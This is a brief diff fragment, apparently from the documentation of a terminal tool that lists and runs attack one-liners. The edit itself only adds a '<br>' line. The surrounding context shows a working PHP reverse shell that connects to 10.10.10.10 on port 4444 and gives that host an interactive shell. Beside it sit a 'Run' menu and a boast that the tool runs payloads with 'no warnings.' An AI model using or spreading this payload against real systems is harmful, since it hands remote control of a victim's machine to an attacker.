@@ -29,3 +29,5 @@ Press `r` → it runs. No warnings. No mercy.
 php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 [r] Run  •  [SPACE] Details  •  [ENTER] Copy  •  [q] Quit
+
+<br>
